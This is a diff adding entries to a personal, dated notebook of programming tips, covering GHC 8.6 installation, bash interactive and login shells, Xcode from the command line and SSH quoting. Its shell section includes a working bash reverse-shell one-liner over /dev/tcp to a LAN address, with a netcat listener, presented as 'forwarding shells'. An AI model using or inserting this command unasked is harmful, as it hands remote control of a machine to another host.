@@ -1,3 +1,80 @@
+--------------------------------------------------------------------------------
+Sat May  4 12:30:24 2019 
+KEY: haskell ghc, ghc 8.6, install haskell, Haskell platform, Haskell-platform
+
+Just install newer version ghc 8.6 with 
+brew install ghc 
+ghc 8.6 have many language extensions, one of them is multiple way if statement
+
+let var = x + y + z
+if | var > 0 -> do sth
+   | var < 0 -> do oth
+   | otherwise -> do mth
+
+The older version is 8.4
+
+ HsColour -> /Library/Haskell/ghc-8.4.3-x86_64/bin/HsColour
+ activate-hs -> /Library/Haskell/ghc-8.4.3-x86_64/bin/activate-hs
+ alex -> /Library/Haskell/ghc-8.4.3-x86_64/bin/alex
+ cabal -> /Library/Haskell/ghc-8.4.3-x86_64/bin/cabal
+ cabal.real -> /Library/Haskell/ghc-8.4.3-x86_64/bin/cabal.real
+ cabal.wrap -> /Library/Haskell/ghc-8.4.3-x86_64/bin/cabal.wrap
+ ghc-clang-wrapper -> /Library/Haskell/ghc-8.4.3-x86_64/bin/ghc-clang-wrapper
+ happy -> /Library/Haskell/ghc-8.4.3-x86_64/bin/happy
+ runhaskell -> /Library/Frameworks/GHC.framework/Versions/8.4.3-x86_64/usr/bin/runhaskell
+ stack -> /Library/Haskell/ghc-8.4.3-x86_64/bin/stack
+ uninstall-hs -> /Library/Haskell/ghc-8.4.3-x86_64/bin/uninstall-hs
+--------------------------------------------------------------------------------
+KEY: shell, interactive shell, non-interactive shell
+
+An interactive (bash) shell executes the file .bashrc so you have to put any relevant variables or settings in this file.
+
+A non-interactive shell
+A non-interactive shell is a shell that can not interact with the user. It’s most often run from a script or similar. This means that .bashrc and .profile are not executed. It is important to note that this often influences your PATH variable. It is always a good practice to use the full path for a command but even more so in non-interactive shells.
+
+Detect the type of shell, BASH only
+You can detect if you are in an interactive or non-interactive shell with
+
+view sourceprint?
+1
+[[ $- == *i* ]] && echo 'Interactive' || echo 'not-interactive'
+To detect if you are in a login shell or not you have to use the shopt command.
+
+1
+shopt -q login_shell && echo 'login' || echo 'not-login'
+or do
+
+1
+shopt | grep login_shell
+The shopt command allows you to change additional shell optional behavior.
+
+Forwarding shells
+One of the most interesting things that you can do with a shell is to forward it to another host. You will need nc or netcat on the host to which you forward the shell.
+
+On the host with the shell you have to issue the command
+
+1
+bash -i >& /dev/tcp/192.168.218.1/9999 0>&1
+The address 192.168.218.1 is the host to which you want to forward the shell. After the IP (note that you can also use a hostname but I strongly suggest you use an IP to prevent issues with hostname-resolving) you have to put the port number (9999) on which the netcat listener will listen.
+
+You have to start the netcat listener on the other side. Double check that there are no firewall rules preventing you from accepting connections.
+
+1
+nc -l 9999
+Some versions of netcat require you to add -p before the port number. If all goes well you should get the shell on the listening host.
+
+--------------------------------------------------------------------------------
+KEY: use Xcode from command line
+You need to use: open -a Xcode file.txt  => open file
+--------------------------------------------------------------------------------
+Fri May  3 12:05:40 2019 
+KEY: ssh to server, ssh remote server, ssh server, ssh path, ssh remote path
+
+https://superuser.com/questions/1192022/non-interactive-ssh-session-not-finding-command-even-though-it-is-in-the-path
+
+>ssh server.address "echo $PATH"
+returns the $PATH of your local shell even though it is written from the remote one. The variable expansion in quotes is done before sending the command to the server. To get the remote path, you need to use
+>ssh server.address 'echo $PATH'
 -------------------------------------------------------------------------------- 
 Mon Apr 29 17:03:18 2019 
 KEY: groovy, groovy example
